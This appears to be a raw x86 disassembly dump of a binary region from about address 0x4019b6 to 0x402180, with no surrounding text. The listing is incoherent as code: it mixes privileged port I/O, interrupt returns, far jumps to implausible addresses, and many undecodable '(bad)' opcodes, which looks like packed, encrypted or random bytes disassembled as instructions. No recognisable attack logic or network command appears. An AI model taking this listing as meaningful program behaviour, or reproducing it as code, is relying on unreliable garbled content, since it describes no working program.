  4019b6:	js     0x401966
  4019b8:	in     al,dx
  4019b9:	shr    DWORD PTR [edx+eax*1-0x1e326c7f],0x68
  4019c1:	enter  0xcf8a,0x1
  4019c5:	cmp    ecx,DWORD PTR [eax+eiz*4-0x501fc134]
  4019cc:	pop    edx
  4019cd:	mov    ecx,0x33295af0
  4019d2:	in     al,dx
  4019d3:	scas   al,BYTE PTR es:[edi]
  4019d4:	iret   
  4019d5:	sbb    al,0xf8
  4019d7:	repz mul BYTE PTR [esp+edx*2]
  4019db:	(bad)
  4019de:	mov    ebp,0xdbc08c46
  4019e3:	iret   
  4019e4:	mov    eax,ds:0x135fd78d
  4019e9:	or     DWORD PTR [eax-0x502b79cf],ebp
  4019ef:	xlat   BYTE PTR ds:[ebx]
  4019f0:	jle    0x401a29
  4019f2:	pop    ss
  4019f3:	cli    
  4019f4:	adc    DWORD PTR [esp+ebp*8],0xffffffe0
  4019f8:	mov    DWORD PTR [ebx-0x1],0xf66e5ca8
  4019ff:	bound  esp,QWORD PTR [edx]
  401a01:	mov    edx,0xaba35686
  401a06:	retf   0x5cf8
  401a09:	push   cs
  401a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a0b:	jge    0x4019a4
  401a0d:	cmp    BYTE PTR [ecx*2+0x7c9b8070],0x6c
  401a15:	jo     0x401a35
  401a17:	xchg   BYTE PTR [edi],bh
  401a19:	mov    bl,0x1d
  401a1b:	mov    DWORD PTR [esi+0x58868bc8],ecx
  401a21:	sbb    al,0x68
  401a23:	or     ch,BYTE PTR [esi+ebx*2+0x5c]
  401a27:	outs   dx,BYTE PTR ds:[esi]
  401a28:	mov    ecx,0x156285ef
  401a2d:	or     ah,0x21
  401a30:	or     ah,0x55
  401a33:	inc    edx
  401a34:	dec    edx
  401a35:	and    edi,DWORD PTR [ebp-0x62]
  401a38:	in     eax,0x9
  401a3a:	mov    dh,0xcb
  401a3c:	sti    
  401a3d:	jbe    0x401a1c
  401a3f:	scas   eax,DWORD PTR es:[edi]
  401a40:	and    BYTE PTR [eax-0x29e07e3d],dh
  401a46:	mov    ds:0x90447011,al
  401a4b:	shr    esp,cl
  401a4d:	push   esi
  401a4e:	out    dx,eax
  401a4f:	sbb    ch,BYTE PTR [eax-0x540f6cc7]
  401a55:	ret    
  401a56:	fld    QWORD PTR ds:[ebp+0x5c72f8a9]
  401a5d:	sub    al,0x6
  401a60:	sub    DWORD PTR [eax+ecx*8+0x9],ebx
  401a64:	in     eax,0xf1
  401a66:	cs leave 
  401a68:	dec    ebx
  401a69:	mov    cl,0x26
  401a6b:	mov    esi,0x9a86f51b
  401a70:	jmp    0x6c353374
  401a75:	xor    BYTE PTR [ebx+0x15],bl
  401a78:	mov    eax,0x2d0746f9
  401a7d:	ins    DWORD PTR es:[edi],dx
  401a7e:	sbb    DWORD PTR [edi],ebp
  401a80:	xor    BYTE PTR [ecx-0x67],0x84
  401a84:	fisub  WORD PTR [ebp-0x331777ef]
  401a8a:	out    0x72,eax
  401a8c:	les    ecx,FWORD PTR [eax+ecx*1]
  401a8f:	popf   
  401a90:	ss dec ebp
  401a92:	inc    edx
  401a93:	or     al,0x57
  401a95:	test   BYTE PTR [edx+eiz*1],dl
  401a98:	xor    eax,ebx
  401a9a:	rol    BYTE PTR [esi-0x43203946],1
  401aa0:	jge    0x401a22
  401aa2:	mov    ds:0xf8d20d69,al
  401aa7:	xlat   BYTE PTR ds:[ebx]
  401aa8:	sub    eax,0x72fc48d3
  401aad:	push   esp
  401aae:	hlt    
  401aaf:	lahf   
  401ab0:	mov    ebx,DWORD PTR [edi+0x5e]
  401ab3:	push   ebx
  401ab4:	xchg   esi,eax
  401ab5:	(bad)  
  401ab6:	icebp  
  401ab7:	(bad)  
  401ab9:	push   ss
  401aba:	mov    ds:0x9e1c94f4,eax
  401abf:	shl    al,0xc3
  401ac2:	mov    bh,0xfd
  401ac4:	in     al,0xb5
  401ac6:	pmulhuw mm1,mm4
  401ac9:	call   0x1d87b4ab
  401ace:	stos   DWORD PTR es:[edi],eax
  401acf:	xchg   edx,edi
  401ad1:	(bad)  
  401ad2:	dec    ebx
  401ad3:	sbb    al,0x6a
  401ad5:	adc    eax,0xb9dcdb89
  401ada:	push   eax
  401adb:	test   al,0x58
  401add:	xchg   DWORD PTR [ecx],ecx
  401adf:	(bad)  
  401ae0:	jae    0x401ac9
  401ae2:	loope  0x401b43
  401ae4:	pop    ebp
  401ae5:	daa    
  401ae6:	xor    ebp,DWORD PTR [esi]
  401ae8:	stc    
  401ae9:	(bad)  
  401aea:	and    al,BYTE PTR [ebp+edx*4-0x6f165da5]
  401af1:	inc    edi
  401af2:	in     eax,dx
  401af3:	(bad)  
  401af4:	retf   0x252a
  401af7:	jg     0x401adb
  401af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401afa:	pop    es
  401afb:	fistp  WORD PTR [esi]
  401afd:	repnz into 
  401aff:	clc    
  401b00:	addr16 dec eax
  401b02:	push   ds
  401b03:	jne    0x401b81
  401b05:	cli    
  401b06:	repnz push es
  401b08:	jmp    0x9a87:0x3c5942a
  401b0f:	jge    0x401b24
  401b11:	push   ds
  401b12:	push   0x40
  401b14:	and    DWORD PTR [eax-0x3e],ecx
  401b17:	int3   
  401b18:	add    bh,al
  401b1a:	mov    dh,0xe5
  401b1c:	pop    ss
  401b1d:	add    al,0x3e
  401b1f:	jl     0x401af0
  401b21:	sbb    DWORD PTR [edi],esi
  401b23:	pop    esp
  401b24:	cmp    DWORD PTR [ebx+0x7a],edx
  401b27:	pusha  
  401b28:	(bad)  
  401b29:	and    eax,0x9288232e
  401b2e:	call   0xaccc:0xe3f6809c
  401b35:	cwde   
  401b36:	out    0xd6,al
  401b38:	sbb    DWORD PTR [edx],eax
  401b3a:	addr16 cmc 
  401b3c:	in     al,0x4d
  401b3e:	sbb    BYTE PTR [ebx],bh
  401b40:	xchg   edx,eax
  401b41:	push   eax
  401b43:	push   edx
  401b44:	sbb    BYTE PTR [edx],dh
  401b46:	and    al,0x67
  401b48:	jecxz  0x401bbb
  401b4a:	sbb    al,0xd8
  401b4c:	aad    0x78
  401b4e:	call   0xc29c:0x12e728b5
  401b55:	aam    0x3e
  401b57:	and    bh,bl
  401b59:	adc    esp,DWORD PTR [edi]
  401b5b:	pusha  
  401b5c:	and    al,0xa8
  401b5e:	mov    ?,WORD PTR [eax]
  401b60:	adc    DWORD PTR [eax+esi*4+0x70],0xf9b2918e
  401b68:	outs   dx,BYTE PTR ds:[esi]
  401b69:	rcl    BYTE PTR [eax+0x5e],cl
  401b6c:	mov    bh,0x51
  401b6e:	and    BYTE PTR [ecx+0x13],dh
  401b71:	xchg   edx,eax
  401b72:	adc    ch,dh
  401b74:	mov    ah,0x39
  401b76:	and    edi,DWORD PTR [edx-0x626dd2e3]
  401b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b7d:	jg     0x401b2e
  401b7f:	dec    ebx
  401b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b81:	scas   al,BYTE PTR es:[edi]
  401b82:	sar    esp,0xc
  401b85:	xor    DWORD PTR [ebx+0x1801c300],esp
  401b8b:	xor    ecx,ebx
  401b8d:	fisubr DWORD PTR [edi-0x1e0c7c6]
  401b93:	cs out dx,eax
  401b95:	dec    edi
  401b96:	fnstsw WORD PTR [edx+ebx*4]
  401b99:	fisub  DWORD PTR [ebx+eax*1-0x11d38c2c]
  401ba0:	and    ebp,DWORD PTR [ecx]
  401ba2:	add    DWORD PTR [edi+edx*4],edx
  401ba5:	mov    eax,ds:0x1f75cc20
  401baa:	mov    WORD PTR [ecx],?
  401bac:	les    ebx,FWORD PTR [eax-0x6e]
  401baf:	loop   0x401be4
  401bb1:	xor    al,0x2f
  401bb3:	test   BYTE PTR [edi],dh
  401bb5:	ror    DWORD PTR [eax-0x5c],1
  401bb8:	mov    ds:0x9a6cd0c5,al
  401bbd:	jecxz  0x401b86
  401bbf:	xor    al,0x5e
  401bc1:	imul   edx,DWORD PTR [ebx+ebp*4],0xe7da47c7
  401bc8:	dec    edx
  401bc9:	fst    QWORD PTR [esi+0x39]
  401bcc:	rol    BYTE PTR [esi],0x5d
  401bcf:	pop    ebx
  401bd0:	mov    ?,WORD PTR [esi-0xe]
  401bd3:	arpl   WORD PTR [eax+0x3a],sp
  401bd6:	and    ebx,DWORD PTR [ebx+0x2d]
  401bd9:	(bad)  
  401bda:	mov    ebx,0x99a9ae40
  401bdf:	inc    ebx
  401be0:	aam    0x3b
  401be2:	outs   dx,DWORD PTR ds:[esi]
  401be3:	loop   0x401c46
  401be5:	push   eax
  401be6:	call   0x7a70:0x76ddfe05
  401bed:	out    dx,eax
  401bee:	cmp    eax,0x967897de
  401bf3:	adc    al,0x92
  401bf5:	inc    ecx
  401bf6:	jecxz  0x401c39
  401bf8:	push   edx
  401bf9:	mov    ah,0xe8
  401bfb:	mov    al,ds:0x68e5a44a
  401c00:	add    eax,0x35b253f9
  401c05:	leave  
  401c06:	adc    al,0xf8
  401c08:	xor    al,0xc0
  401c0a:	test   DWORD PTR [esi-0x6c],esp
  401c0d:	retf   
  401c0e:	dec    ebp
  401c0f:	cmp    DWORD PTR [ebp+0x5baee609],ebx
  401c15:	test   DWORD PTR [esi],0x3b4c7f68
  401c1b:	fstp   QWORD PTR [ebp+esi*2+0x5ca2bce8]
  401c22:	mov    ebp,0xef476af8
  401c27:	mov    dl,0xf
  401c29:	inc    edx
  401c2a:	in     eax,dx
  401c2b:	sahf   
  401c2c:	mov    ebx,0x39268723
  401c31:	xor    bl,BYTE PTR [ebp-0x5c]
  401c34:	inc    ebx
  401c35:	psubusb mm7,QWORD PTR [esi+0x3f]
  401c39:	and    eax,0x1f839d4b
  401c3e:	dec    ebx
  401c3f:	jae    0x401c56
  401c41:	dec    esi
  401c42:	in     eax,dx
  401c43:	mov    ds:0x8ccea98c,al
  401c48:	mov    edi,0x7c0639d3
  401c4d:	mov    ah,0x82
  401c4f:	sub    bh,BYTE PTR [ebx]
  401c51:	dec    ebx
  401c52:	stos   BYTE PTR es:[edi],al
  401c53:	cmc    
  401c54:	xchg   ebx,eax
  401c55:	fstp   st(1)
  401c57:	shl    BYTE PTR [ecx-0x50],0xfd
  401c5b:	xor    eax,0x17b66f66
  401c60:	xchg   ecx,eax
  401c61:	leave  
  401c62:	addr16 push ds
  401c64:	xor    eax,0xeb05679c
  401c69:	cs sub esp,edx
  401c6c:	aad    0xb1
  401c6e:	ret    
  401c6f:	adc    al,bl
  401c71:	add    BYTE PTR [ebx+0x8067736],0xd7
  401c78:	jno    0x401c73
  401c7a:	dec    ebp
  401c7b:	and    al,0xfe
  401c7d:	jge    0x401c29
  401c7f:	(bad)  
  401c80:	cmp    al,0xd3
  401c82:	cmp    ecx,DWORD PTR [edi]
  401c84:	fld    st(2)
  401c86:	dec    ecx
  401c87:	push   0x3fd37853
  401c8c:	pop    esi
  401c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c8e:	stos   DWORD PTR es:[edi],eax
  401c8f:	sbb    edx,edx
  401c91:	mov    BYTE PTR [eax+eax*2],bh
  401c94:	sub    DWORD PTR [ecx+0x6f],edi
  401c97:	push   esi
  401c98:	sub    eax,0x52f9e4d
  401c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c9e:	sub    al,0x46
  401ca0:	jmp    0x401d07
  401ca2:	xchg   ebx,eax
  401ca3:	out    0x31,al
  401ca5:	addr16 mov cl,0xd3
  401ca8:	add    BYTE PTR [eax],ch
  401caa:	or     bh,0xcb
  401cad:	stc    
  401cae:	xchg   ebx,eax
  401caf:	sbb    BYTE PTR [esp+edi*2+0xf],0x78
  401cb4:	adc    bh,BYTE PTR ds:0x8f5e95d1
  401cba:	and    al,0x15
  401cbc:	fbstp  TBYTE PTR [eax]
  401cbe:	in     al,0xa
  401cc0:	(bad)  
  401cc1:	mov    ebp,0x2ea0971f
  401cc6:	xchg   esi,eax
  401cc7:	xchg   BYTE PTR [esi-0xe],bl
  401cca:	out    dx,al
  401ccb:	or     ebx,ebp
  401ccd:	sub    BYTE PTR [edx-0x78a5c974],ch
  401cd3:	test   BYTE PTR [ecx],0x60
  401cd6:	fistp  DWORD PTR [edx]
  401cd8:	jmp    0xdc299d36
  401cdd:	xchg   ebx,eax
  401cde:	pop    edx
  401cdf:	out    0xd1,al
  401ce1:	lea    ebp,[esi+0x6207bdba]
  401ce7:	test   BYTE PTR [ebx],al
  401ce9:	icebp  
  401cea:	push   ecx
  401ceb:	or     DWORD PTR [esi+edi*4+0x1d18f916],ecx
  401cf2:	push   ecx
  401cf3:	mov    BYTE PTR [edx-0x4],dl
  401cf6:	arpl   WORD PTR [eax-0x19c20db2],bx
  401cfc:	nop
  401cfd:	mov    bh,0x78
  401cff:	idiv   BYTE PTR [edx-0xaf9e1a]
  401d05:	dec    edx
  401d06:	cmp    DWORD PTR [eax+ebx*2-0x3],ecx
  401d0a:	enter  0xe0f4,0x97
  401d0e:	mov    ?,WORD PTR [edx-0x47]
  401d11:	aas    
  401d12:	imul   edx,DWORD PTR [ebp+eax*4-0x6a],0xb3be2190
  401d1a:	ins    BYTE PTR es:[edi],dx
  401d1b:	mov    edx,0xe14f78b5
  401d20:	xchg   esp,eax
  401d21:	ror    bh,1
  401d23:	iret   
  401d24:	stos   BYTE PTR es:[edi],al
  401d25:	mov    ?,WORD PTR [ecx-0x3b9408ee]
  401d2b:	rcr    BYTE PTR [eax+0x5ab9fc7a],cl
  401d31:	mov    ecx,0xa5095c50
  401d36:	loope  0x401d55
  401d38:	pop    eax
  401d39:	loop   0x401d69
  401d3b:	lds    ebx,FWORD PTR [ebx-0x4]
  401d3e:	ins    DWORD PTR es:[edi],dx
  401d3f:	call   0x1b1e193
  401d44:	sub    DWORD PTR [esi+0x3fe1cf1a],0x3d4c3ed2
  401d4e:	nop
  401d4f:	jno    0x401d97
  401d51:	push   es
  401d52:	mov    ah,0xba
  401d54:	fwait
  401d55:	rcl    ebp,1
  401d57:	push   eax
  401d58:	std    
  401d59:	mov    eax,ds:0x90b51063
  401d5e:	and    BYTE PTR [esi+0x3ff5e5ed],dl
  401d64:	push   0x5b
  401d66:	out    0xe2,al
  401d68:	push   ds
  401d69:	rcl    eax,1
  401d6b:	(bad)  
  401d6c:	dec    ebx
  401d6d:	xor    bh,BYTE PTR [edi]
  401d6f:	inc    esi
  401d70:	xchg   esp,eax
  401d71:	mov    DWORD PTR [esi],edx
  401d73:	xor    al,0x76
  401d75:	jp     0x401d6f
  401d77:	out    0x59,al
  401d79:	arpl   WORD PTR [edx],si
  401d7b:	in     eax,0x36
  401d7d:	cmp    DWORD PTR [ecx+0x78],eax
  401d80:	push   0x1fed4441
  401d85:	jno    0x401d77
  401d87:	cmp    eax,0xe9fab5d8
  401d8c:	mov    BYTE PTR [ebx-0x4a8c0ae8],bh
  401d92:	iret   
  401d93:	daa    
  401d94:	loop   0x401d56
  401d96:	jp     0x401d6b
  401d98:	(bad)  
  401d99:	mov    WORD PTR [eax-0x30],ds
  401d9c:	cwde   
  401d9d:	jl     0x401e0b
  401d9f:	jmp    0xe4e3:0xd44115bd
  401da6:	jge    0x401d48
  401da8:	pop    esp
  401da9:	aaa    
  401daa:	out    dx,al
  401dab:	or     DWORD PTR [edx],ecx
  401dad:	mov    ebp,0xcacfe682
  401db2:	xor    edx,esp
  401db4:	retf   
  401db5:	clc    
  401db6:	jae    0x401e11
  401db8:	lahf   
  401db9:	mov    edi,edi
  401dbb:	fxam   
  401dbd:	clc    
  401dbe:	mov    BYTE PTR [ebp+0x6363fbc8],bl
  401dc4:	aam    0xc4
  401dc6:	pop    ecx
  401dc7:	jbe    0x401daf
  401dc9:	jecxz  0x401dc8
  401dcb:	call   DWORD PTR [ebx-0x7dd9ad0c]
  401dd1:	out    0x3f,eax
  401dd3:	mov    ch,0xd2
  401dd5:	xor    esp,ecx
  401dd7:	mov    ah,0x22
  401dd9:	lods   al,BYTE PTR ds:[esi]
  401dda:	mov    dh,0xd4
  401ddc:	mov    bh,0xb8
  401dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ddf:	xor    BYTE PTR [ecx+0x2e07510f],dh
  401de5:	push   esi
  401de6:	jle    0x401e4e
  401de8:	and    BYTE PTR [edx+eiz*2+0x1a],dl
  401dec:	es jo  0x401e00
  401def:	inc    esp
  401df0:	das    
  401df1:	mov    ch,0xdf
  401df3:	jmp    0x58401a13
  401df8:	dec    eax
  401df9:	pop    edi
  401dfa:	adc    DWORD PTR [ebp+0x3d],esi
  401dfd:	jg     0x401e3e
  401dff:	push   ds
  401e00:	and    ebp,DWORD PTR [edi+esi*4]
  401e03:	and    edi,DWORD PTR [edx-0x40a4c82]
  401e09:	fldenv [edi]
  401e0b:	add    bh,BYTE PTR [edx]
  401e0d:	popa   
  401e0e:	loope  0x401da8
  401e10:	ret    0xc34d
  401e13:	ss ins DWORD PTR es:[edi],dx
  401e15:	and    ah,BYTE PTR [ecx+0x36]
  401e18:	jno    0x401e74
  401e1a:	stc    
  401e1b:	sbb    al,0x5c
  401e1d:	pop    ecx
  401e1e:	out    dx,al
  401e1f:	out    0x46,al
  401e21:	aad    0xf0
  401e23:	dec    edx
  401e24:	push   ebp
  401e25:	or     bh,bl
  401e27:	xchg   edi,eax
  401e28:	and    ebx,DWORD PTR [edx+0x665200ab]
  401e2e:	ror    DWORD PTR ss:[ecx-0x2caa813],1
  401e35:	jb     0x401ddf
  401e37:	and    BYTE PTR [esi+0x1cf8fbe],dh
  401e3d:	inc    ecx
  401e3e:	xchg   ebp,eax
  401e3f:	push   eax
  401e40:	push   ss
  401e41:	fist   DWORD PTR [edx+0x741a05cf]
  401e47:	pop    edx
  401e48:	xor    al,0x4e
  401e4a:	(bad)
  401e4d:	mov    al,ds:0x8a3845e6
  401e52:	cli    
  401e53:	jmp    0x401ea1
  401e55:	push   edx
  401e56:	pop    es
  401e57:	push   cs
  401e58:	mov    al,ds:0xd813e04b
  401e5d:	jp     0x401e2a
  401e5f:	cmp    al,0xa8
  401e61:	lahf   
  401e62:	sbb    dh,dl
  401e64:	fcmovb st,st(7)
  401e66:	cld    
  401e67:	jbe    0x401ecb
  401e69:	sub    eax,0xad5a9d86
  401e6e:	call   DWORD PTR [edx+0x4e4d1de3]
  401e74:	add    cl,bh
  401e76:	push   ecx
  401e77:	stos   DWORD PTR es:[edi],eax
  401e78:	pop    es
  401e79:	mov    edi,0x842b99f0
  401e7e:	cmp    eax,0xc4609ad
  401e83:	test   eax,0x8f9a896b
  401e88:	repnz (bad) [ecx+0x3894e622]
  401e8f:	pushf  
  401e90:	and    DWORD PTR [edi-0x56d0dbcf],edi
  401e96:	adc    al,0xfc
  401e98:	sysenter 
  401e9a:	add    al,0x6a
  401e9c:	int3   
  401e9d:	clc    
  401e9e:	or     al,0x51
  401ea0:	cmp    edx,esi
  401ea2:	cwde   
  401ea3:	push   ecx
  401ea4:	test   DWORD PTR [esi+eiz*1-0x100ec06c],0xcfe00405
  401eaf:	adc    eax,DWORD PTR [eax+0x789f922a]
  401eb5:	add    BYTE PTR [ecx+0x59],0xef
  401eb9:	sbb    BYTE PTR [edi+0x61],al
  401ebc:	or     eax,0x6660ffcd
  401ec1:	sub    eax,0x8e67a1a
  401ec6:	popa   
  401ec7:	and    al,0x12
  401ec9:	push   cs
  401eca:	loope  0x401f35
  401ecc:	pop    ss
  401ecd:	adc    DWORD PTR [esi+0x32],edi
  401ed0:	mov    cl,0x47
  401ed2:	imul   edx,DWORD PTR [ecx-0x46],0x177f924c
  401ed9:	push   cs
  401eda:	call   DWORD PTR [ebx+0x63]
  401edd:	xchg   ebp,eax
  401ede:	and    al,0x82
  401ee0:	(bad)  
  401ee1:	mov    cl,0x82
  401ee3:	in     eax,dx
  401ee4:	xor    eax,0x6926dd4f
  401ee9:	sbb    bh,BYTE PTR [eax-0x34209190]
  401eef:	xor    cl,dl
  401ef1:	sbb    edi,DWORD PTR [eax]
  401ef3:	mov    ds:0xa48e1dd3,al
  401ef8:	dec    esi
  401ef9:	xor    esp,DWORD PTR [ebp-0x52]
  401efc:	sbb    BYTE PTR [ebp-0x5fc91453],cl
  401f02:	sbb    dl,BYTE PTR [ecx+0x37]
  401f05:	jo     0x401eaa
  401f07:	inc    eax
  401f08:	xor    eax,0x5ac69132
  401f0d:	pop    ecx
  401f0e:	xor    BYTE PTR [ebp-0x3a3f8799],bl
  401f14:	scas   al,BYTE PTR es:[edi]
  401f15:	ret    
  401f16:	mov    ah,0xd5
  401f18:	push   ss
  401f19:	mov    ecx,0x88db90e3
  401f1e:	clc    
  401f1f:	xchg   ebp,eax
  401f20:	push   cs
  401f21:	sub    bl,BYTE PTR ds:0x262a1562
  401f27:	hlt    
  401f28:	(bad)  
  401f29:	jg     0x401f93
  401f2b:	imul   esi,esp,0x60
  401f2e:	push   edi
  401f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f30:	cwde   
  401f31:	sbb    eax,0x8a50ae87
  401f36:	adc    edx,DWORD PTR [ecx]
  401f38:	test   al,0xb7
  401f3a:	mov    DWORD PTR ds:0xc2146adc,0xb8ac8813
  401f44:	test   DWORD PTR [ebx-0x88e1174],eax
  401f4a:	fwait
  401f4b:	ja     0x401f16
  401f4d:	retf   0x16c2
  401f50:	lea    edi,[ebp-0xaa898eb]
  401f56:	daa    
  401f57:	and    al,0x8e
  401f59:	cmp    ah,al
  401f5b:	int    0xab
  401f5d:	fstp   TBYTE PTR [ecx-0x6a]
  401f60:	in     al,dx
  401f61:	sar    DWORD PTR [eax+0x28221fa0],1
  401f67:	mov    cl,BYTE PTR [ebx-0x63e01f76]
  401f6d:	fadd   DWORD PTR [ebx+0x57bd8552]
  401f73:	(bad)  
  401f74:	mov    ebx,0x911d2eb
  401f79:	lea    ebx,[esi-0x1dec21f3]
  401f7f:	jb     0x401f04
  401f81:	xor    DWORD PTR [esi+eiz*8],esp
  401f84:	xchg   ebp,eax
  401f85:	rcr    BYTE PTR [ecx+ebp*4-0x18],cl
  401f89:	xchg   esp,eax
  401f8a:	mov    dh,0x7a
  401f8c:	clc    
  401f8d:	(bad)  
  401f8e:	pop    ebx
  401f8f:	inc    ebp
  401f90:	add    BYTE PTR [ebp-0x60565504],ch
  401f96:	sub    BYTE PTR [edi],bl
  401f98:	call   0xe3eae3a7
  401f9d:	sbb    edx,DWORD PTR [esi+0x1e]
  401fa0:	scas   al,BYTE PTR es:[edi]
  401fa1:	mov    eax,ds:0xa2085268
  401fa6:	mov    edx,0x53e74eb2
  401fab:	fwait
  401fac:	cmp    bh,BYTE PTR ss:[eax+0x14]
  401fb0:	sbb    eax,0xd5022ff1
  401fb5:	mov    bh,BYTE PTR [edi+edx*1]
  401fb8:	push   edx
  401fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fba:	jge    0x401fda
  401fbc:	stos   BYTE PTR es:[edi],al
  401fbd:	push   esp
  401fbe:	push   ebx
  401fbf:	fldenv [ecx]
  401fc1:	rcr    DWORD PTR [ecx-0x40d61c47],1
  401fc7:	mov    cl,0xcb
  401fc9:	pop    ecx
  401fca:	add    bh,bl
  401fcc:	pop    ss
  401fcd:	pop    esp
  401fce:	push   edi
  401fcf:	bound  edi,QWORD PTR [esi-0x32]
  401fd2:	daa    
  401fd3:	adc    ebx,DWORD PTR [ebp+0x1228fdc3]
  401fd9:	push   ecx
  401fda:	or     DWORD PTR ds:0x42053abf,edi
  401fe0:	mov    ch,0x2b
  401fe2:	push   edi
  401fe3:	push   edx
  401fe4:	mov    eax,ecx
  401fe6:	pop    edi
  401fe7:	sbb    DWORD PTR [edi+0xeb32c51],eax
  401fed:	push   ebx
  401fee:	push   ds
  401fef:	mov    ch,0x93
  401ff1:	mov    al,0x5
  401ff3:	inc    edx
  401ff4:	and    DWORD PTR [eax-0x6],ecx
  401ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ff8:	dec    ecx
  401ff9:	outs   dx,DWORD PTR ds:[esi]
  401ffa:	aas    
  401ffb:	xchg   DWORD PTR [edx+0x6923ea5a],ecx
  402001:	pop    esp
  402002:	push   0x73
  402004:	sub    edi,DWORD PTR [ecx]
  402006:	data16 cli 
  402008:	adc    BYTE PTR [edi],bl
  40200a:	sub    ebp,DWORD PTR [ebx-0x17654235]
  402010:	pop    ds
  402011:	jl     0x401fee
  402013:	mov    ebx,0xbf244ae9
  402018:	xchg   esp,eax
  402019:	or     ebx,ecx
  40201b:	stos   DWORD PTR es:[edi],eax
  40201c:	and    eax,0x6207c851
  402021:	imul   edi,DWORD PTR [edx-0x43],0xaff2fbc0
  402028:	add    DWORD PTR [ebp-0x5081ec94],ebx
  40202e:	sbb    ecx,ebx
  402030:	xchg   DWORD PTR [edx-0x38719245],edi
  402036:	or     BYTE PTR [eax],ch
  402038:	mov    ebx,0x2eb643d6
  40203d:	shl    BYTE PTR [esi+0x4c],0x20
  402041:	adc    eax,0x723fc246
  402046:	mov    edx,0x6b14b4de
  40204b:	xor    dl,dh
  40204d:	xchg   ecx,eax
  40204e:	inc    ecx
  40204f:	cmp    DWORD PTR [edx+0xd82b8e9],esi
  402055:	test   al,0x7c
  402057:	jae    0x4020d5
  402059:	rcr    al,0x65
  40205c:	sbb    ecx,DWORD PTR [esi+0x7bd9bedd]
  402062:	out    0x3f,eax
  402064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402065:	out    0x45,eax
  402067:	leave  
  402068:	sahf   
  402069:	jns    0x4020db
  40206b:	or     eax,0x3debfd44
  402070:	in     al,0xee
  402072:	adc    eax,0xc1cb4b1c
  402077:	fistp  WORD PTR [edx-0x18ccb588]
  40207d:	pop    eax
  40207e:	dec    ebx
  40207f:	daa    
  402080:	lea    esp,ds:0x89d88f8e
  402086:	pusha  
  402087:	inc    eax
  402088:	inc    eax
  402089:	jns    0x4020ec
  40208b:	push   edi
  40208c:	mov    bh,0xde
  40208e:	fistp  DWORD PTR [ebx+0x45c1ccc5]
  402094:	daa    
  402095:	daa    
  402096:	adc    edi,ebx
  402098:	sub    BYTE PTR [ecx],dh
  40209a:	fstp   DWORD PTR [esi+0x2fd749a]
  4020a0:	pusha  
  4020a1:	pop    ebx
  4020a2:	push   esp
  4020a3:	aam    0xd
  4020a5:	aam    0x11
  4020a7:	add    al,0x4f
  4020a9:	clc    
  4020aa:	mov    ebp,0x3bb4688a
  4020af:	test   DWORD PTR [eax],ebx
  4020b1:	lea    edx,[edx-0x5c]
  4020b4:	mov    BYTE PTR [ebx-0x65],bh
  4020b7:	call   0x31bfaad0
  4020bc:	inc    ecx
  4020bd:	add    DWORD PTR [edx],ebp
  4020bf:	jp     0x402102
  4020c1:	push   eax
  4020c2:	stc    
  4020c3:	cmp    DWORD PTR [edx+0x6c2c8c48],ebp
  4020c9:	xor    eax,0xe4934c77
  4020ce:	(bad)  
  4020cf:	(bad)  
  4020d0:	jge    0x40205e
  4020d2:	(bad)  
  4020d3:	lods   al,BYTE PTR ds:[esi]
  4020d4:	ror    BYTE PTR [esi+0x19],0xda
  4020d8:	sbb    al,0x6c
  4020da:	jp     0x40210d
  4020dc:	push   es
  4020dd:	mov    al,0xc2
  4020df:	jmp    0x40206b
  4020e1:	mov    ebp,0x3db17dbe
  4020e6:	xor    DWORD PTR [edx+esi*4],ecx
  4020e9:	and    eax,0x46714dce
  4020ee:	push   0xfffffff4
  4020f0:	ins    BYTE PTR es:[edi],dx
  4020f1:	pop    ebx
  4020f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020f3:	arpl   WORD PTR [edi],sp
  4020f5:	ja     0x402111
  4020f7:	push   esi
  4020f8:	ja     0x4020b3
  4020fa:	dec    eax
  4020fb:	mov    ebx,0xfe03e8b6
  402100:	pop    ecx
  402101:	xchg   edi,eax
  402102:	adc    DWORD PTR [edx+edx*4-0x4cfe934c],edx
  402109:	and    BYTE PTR [edi-0x72],cl
  40210c:	dec    ebp
  40210d:	dec    esp
  40210e:	ror    cl,1
  402110:	jbe    0x40215a
  402112:	adc    eax,0xb7185cd9
  402117:	and    eax,0x35a3fc48
  40211c:	scas   eax,DWORD PTR es:[edi]
  40211d:	jge    0x402170
  40211f:	mov    dl,0x6d
  402121:	lock imul ebp,DWORD PTR [ebp-0x1a041e80],0x6d1806d5
  40212c:	jae    0x4021a0
  40212e:	retf   0xcbbe
  402131:	stc    
  402132:	mov    ecx,0x8e517ad9
  402137:	lods   al,BYTE PTR ds:[esi]
  402138:	xor    eax,0x7d44c3e9
  40213d:	jne    0x4020e1
  40213f:	nop
  402140:	nop
  402141:	(bad)  
  402142:	fist   DWORD PTR ds:0xcf64bc49
  402148:	dec    ebp
  402149:	pop    esp
  40214a:	stos   DWORD PTR es:[edi],eax
  40214b:	push   0x6f
  40214d:	xchg   esi,eax
  40214e:	sar    DWORD PTR [edx+0x336f9bbb],cl
  402154:	mov    esp,0xdd64e833
  402159:	adc    eax,0x8a4e315d
  40215e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40215f:	aam    0xa
  402161:	sub    BYTE PTR [ebp-0x4d],al
  402164:	aad    0x85
  402166:	dec    edx
  402167:	scas   al,BYTE PTR es:[edi]
  402168:	(bad)  
  402169:	in     eax,0x13
  40216b:	inc    esi
  40216c:	test   BYTE PTR [ebp+0x304a63f0],dl
  402172:	mov    ch,0xd
  402174:	pushf  
  402175:	in     eax,dx
  402176:	mov    ebp,0xb437a85
  40217b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40217c:	pop    eax
  40217d:	and    al,0x52
  40217f:	xlat   BYTE PTR ds:[ebx]
  402180:	(bad)  
